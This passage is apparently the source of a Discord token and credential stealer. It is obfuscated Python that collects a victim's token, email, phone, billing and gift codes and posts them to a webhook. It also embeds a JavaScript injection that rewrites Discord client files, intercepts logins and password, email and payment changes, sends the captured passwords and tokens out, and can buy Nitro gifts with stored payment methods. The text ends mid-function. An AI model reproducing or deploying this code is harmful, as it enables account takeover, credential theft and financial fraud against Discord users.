            YHEHRXZVXSQSIBPPPQYZTMFTYCAZGKVTECRMEAZUBUTUMLWKZQBLYDXNXYQA = CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW

        try:
            GDMSWZYCGCCSFIDPSRHAWUUPUAIUZBUFEQLBHLPDDDTLQJQBVPDPMNPJPSGWXS = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV_d15c0rd}).json()
            if GDMSWZYCGCCSFIDPSRHAWUUPUAIUZBUFEQLBHLPDDDTLQJQBVPDPMNPJPSGWXS:
                BKQVDMDVCFSGCJSUKVOPEADZXHFWUWFBCLOEVNJEQZTDTEFFETCDLSVKODTCOVOT = []

                for v4r_method in GDMSWZYCGCCSFIDPSRHAWUUPUAIUZBUFEQLBHLPDDDTLQJQBVPDPMNPJPSGWXS:
                    if v4r_method['type'] == 1:
                        BKQVDMDVCFSGCJSUKVOPEADZXHFWUWFBCLOEVNJEQZTDTEFFETCDLSVKODTCOVOT.append('CB')
                    elif v4r_method['type'] == 2:
                        BKQVDMDVCFSGCJSUKVOPEADZXHFWUWFBCLOEVNJEQZTDTEFFETCDLSVKODTCOVOT.append("Paypal")
                    else:
                        BKQVDMDVCFSGCJSUKVOPEADZXHFWUWFBCLOEVNJEQZTDTEFFETCDLSVKODTCOVOT.append('Other')
                BKQVDMDVCFSGCJSUKVOPEADZXHFWUWFBCLOEVNJEQZTDTEFFETCDLSVKODTCOVOT = ' / '.join(BKQVDMDVCFSGCJSUKVOPEADZXHFWUWFBCLOEVNJEQZTDTEFFETCDLSVKODTCOVOT)
            else:
                BKQVDMDVCFSGCJSUKVOPEADZXHFWUWFBCLOEVNJEQZTDTEFFETCDLSVKODTCOVOT = "None"
        except:
            BKQVDMDVCFSGCJSUKVOPEADZXHFWUWFBCLOEVNJEQZTDTEFFETCDLSVKODTCOVOT = "None"

        try:
            JLMYDGZGFOJSMWUCQZCOAJGVVJABWZTDXCFJOTZBKXSPOBORIEGUMZTQWKTKKGTQWHOHOVGMGRJSKS = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV_d15c0rd}).json()
            if JLMYDGZGFOJSMWUCQZCOAJGVVJABWZTDXCFJOTZBKXSPOBORIEGUMZTQWKTKKGTQWHOHOVGMGRJSKS:
                DPYZVGMXURVZMHAFZOJJQDOKYETVQKJCVCAAMYTQVZBPXEGEGJNABDGUEGMC = []
                for FHUAXXHMFMETABYHBKMGSDSQURHNNNJOJVEMBSBTPPGJKYHQPHAXCTOSYSTQDWWL in JLMYDGZGFOJSMWUCQZCOAJGVVJABWZTDXCFJOTZBKXSPOBORIEGUMZTQWKTKKGTQWHOHOVGMGRJSKS:
                    EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL = FHUAXXHMFMETABYHBKMGSDSQURHNNNJOJVEMBSBTPPGJKYHQPHAXCTOSYSTQDWWL['promotion']['outbound_title']
                    FHUAXXHMFMETABYHBKMGSDSQURHNNNJOJVEMBSBTPPGJKYHQPHAXCTOSYSTQDWWL = FHUAXXHMFMETABYHBKMGSDSQURHNNNJOJVEMBSBTPPGJKYHQPHAXCTOSYSTQDWWL['code']
                    SFGSAPJJPWFEXSGVDVTTVOBHCBOLFBJDCTHNGHNOVUNCBUZFOUSFGPMHPKMOIDPTY = f"Gift: {EXGHRMLUQQZSSURRTUCPXSPCKGQFZGSCLHANUTCRANHQOCAHLWQREMWLPRILHZUJNHQCIVVZZOFGARZFPVL}\nCode: {FHUAXXHMFMETABYHBKMGSDSQURHNNNJOJVEMBSBTPPGJKYHQPHAXCTOSYSTQDWWL}"
                    if len('\n\n'.join(FHUAXXHMFMETABYHBKMGSDSQURHNNNJOJVEMBSBTPPGJKYHQPHAXCTOSYSTQDWWL)) + len(SFGSAPJJPWFEXSGVDVTTVOBHCBOLFBJDCTHNGHNOVUNCBUZFOUSFGPMHPKMOIDPTY) >= 1024:
                        break
                    DPYZVGMXURVZMHAFZOJJQDOKYETVQKJCVCAAMYTQVZBPXEGEGJNABDGUEGMC.append(SFGSAPJJPWFEXSGVDVTTVOBHCBOLFBJDCTHNGHNOVUNCBUZFOUSFGPMHPKMOIDPTY)
                if len(DPYZVGMXURVZMHAFZOJJQDOKYETVQKJCVCAAMYTQVZBPXEGEGJNABDGUEGMC) > 0:
                    FHUAXXHMFMETABYHBKMGSDSQURHNNNJOJVEMBSBTPPGJKYHQPHAXCTOSYSTQDWWL = '\n\n'.join(DPYZVGMXURVZMHAFZOJJQDOKYETVQKJCVCAAMYTQVZBPXEGEGJNABDGUEGMC)
                else:
                    FHUAXXHMFMETABYHBKMGSDSQURHNNNJOJVEMBSBTPPGJKYHQPHAXCTOSYSTQDWWL = "None"
            else:
                FHUAXXHMFMETABYHBKMGSDSQURHNNNJOJVEMBSBTPPGJKYHQPHAXCTOSYSTQDWWL = "None"
        except:
            FHUAXXHMFMETABYHBKMGSDSQURHNNNJOJVEMBSBTPPGJKYHQPHAXCTOSYSTQDWWL = "None"
    
        v4r_software_name, VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD = CLATUSVHYUXYBHCWLUKVCRQASYMIABFHNGRCIFAXRVVVTGRWJPUJX.get(GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV_d15c0rd, ("Unknown Software", "Unknown location"))

        embed = Embed(title=f'Discord Token {JVQTLDADTYXKYZHMXTKHPNYLFIGLMMMLYWLGZYSTPVADECBDSENXNOQZXQKIRPEMBYFMICHEXRUQRVVCYKIJKDAZ}:', color=UZWWSUMHOOULCLVGSESALXIRPLUVNUMSHAYWLKTQUQPYJKZZAJTLG)      
        embed.add_field(name=":file_folder: Path:", value=f"```{VWEPPEFARLZNYGLSKXIZZLIISFSLAACGZZMPYHPCBETEOSPQORDVYIVKXZQUXJOFYVRHOSDLDRKBIHKIIUCEUFBD}```", inline=True)
        embed.add_field(name=":globe_with_meridians: Token:", value=f"```{GBXSTGWXYSRBPMMQFSCLYPXOGQQREPGHRZBGSUINUPQFRWXTARMCYAGZGBYQDHWBQCMNWKDUYKWQTHNAVNGABUXUYSTQV_d15c0rd}```", inline=True)
        embed.add_field(name=":package: Software:", value=f"```{v4r_software_name}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{XUDVYNHBXKDXNOLEWFGEBHMIRHRCLHKSJTBEBWZTRKCMCWALOEENXXUQOWFZXHMPLROJREDEHSVTROI}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{PMURRCTNLMRFLSPVBNYBWDTNQRQZKREFKWQEDCKAYBEEYLNRPAJBYNVWHVXDVGEADEXPTSKHNKTQTEJTU}```", inline=True)
        embed.add_field(name=":robot: Id:", value=f"```{MMYNSTEWFJIRGWKEOOWAYDONJORHOIOUCQFKFKOSDMEYPFGVOSRYYMATPILRLNPEMUFMQHDUGCLOHOAKJS}```", inline=True)
        embed.add_field(name=":e_mail: Email:", value=f"```{VHBRPVQAEJTIKUAGVSJZEFUGNFTSQAFUDOCLEEOOBOSGEGPBWQDNDYMRJKCWDSKNCGYIQANJRWIQFOYCR}```", inline=True)
        embed.add_field(name=":white_check_mark: Email Verified:", value=f"```{ZRJPHJNRWHMQQEHLXYVFPAABUYPLTHMELQMAZMULCYUXZFZQKVXGYWXJWVAIGEQVEZAXNRXQHYGEFCNRXXTZE}```", inline=True)
        embed.add_field(name=":telephone_receiver: Phone:", value=f"```{NGXTPKLXSYACNXPVBKQBHDDLYSIELHWQGBYPVTAJUFCIQWSOHZRQIHAWFFRPWQOFVWWMMJNOTHPIONFBWVOTH}```", inline=True)   
        embed.add_field(name=":rocket: Nitro:", value=f"```{HDYCHTYUIZGEZBDPKGSEKKNJWMFWKMPBNDJACGBRGYWNNHHVYGCOV}```", inline=True)
        embed.add_field(name=":earth_africa: Language:", value=f"```{MMWPYMYPCEWCDEPUQWWOGEOCZTTAGGTPHRYGPGITUOIWEYFHZECTAYNQMXOVDVNSRUSMVMWNTORCNAAVEOAKRQVQVNSFOXTIT}```", inline=True)
        embed.add_field(name=":moneybag: Billing:", value=f"```{BKQVDMDVCFSGCJSUKVOPEADZXHFWUWFBCLOEVNJEQZTDTEFFETCDLSVKODTCOVOT}```", inline=True)
        embed.add_field(name=":gift: Gift Code:", value=f"```{FHUAXXHMFMETABYHBKMGSDSQURHNNNJOJVEMBSBTPPGJKYHQPHAXCTOSYSTQDWWL}```", inline=True)
        embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{QJMKZIQCAMUHMDKKLMSGQJJNRCDSWARDURVMBCBWAEYSSPWHJCDZPKVWSSPUIDOGMK}```", inline=True)
        embed.add_field(name=":frame_photo: Profile Picture:", value=f"", inline=False)
        embed.set_image(url=YHEHRXZVXSQSIBPPPQYZTMFTYCAZGKVTECRMEAZUBUTUMLWKZQBLYDXNXYQA)
        embed.set_footer(text=ZEGRRDVSQIYWYKBGRMSNAHPPITRVDSABIATRSVBWNGINWGLPWBTONTBGLGWGSCKWTLLBAIKBDJLFYYWRXG, icon_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW)
        OQVNJZGZEZGGYFVTIJBUPKNPLVEYQAUXNKDLUSMNVSEEKXEOCZSHNSAEER.send(embed=embed, username=PDHSHFGMMAJVSNBRHNDWCMJWDPOAITBFFSIMKXJQVHZPDCZGEONVALVPYKGUJGGNZXNHODXU, avatar_url=CBYRGELXUIKPDUYMNSQBQLNDULQQYOPBNPSOXFDVQPHZFNRXGATNHUGJSNOMFDGYHBVMQGSKZJENFVSZTZXQCZZSW)

SKFNPTRGCKOCNHXVXOHEVOICXGMWIWHXSXJNTVLIDDNUSEGJAAQJB = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
